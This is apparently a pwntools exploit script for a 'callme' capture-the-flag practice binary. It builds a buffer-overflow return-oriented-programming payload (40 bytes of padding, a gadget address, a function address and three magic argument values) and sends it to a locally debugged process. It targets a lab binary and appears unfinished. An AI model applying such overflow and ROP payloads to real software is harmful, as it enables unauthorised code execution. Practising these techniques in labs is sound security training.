from pwn import *

# chall = process("./callme")
chall = gdb.debug("./callme")

padding = b"A"*40
stackAligner = p64(0x004007c9)
callme_oneAddr = p64(0x00400720)
callme_oneAddr_but_external = p64(0x7bf7e260082e)
callmePayload = p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)


finalPayload = padding + stackAligner + callme_oneAddr + callmePayload


chall.sendafter(b"> ", finalPayload)
chall.interactive()
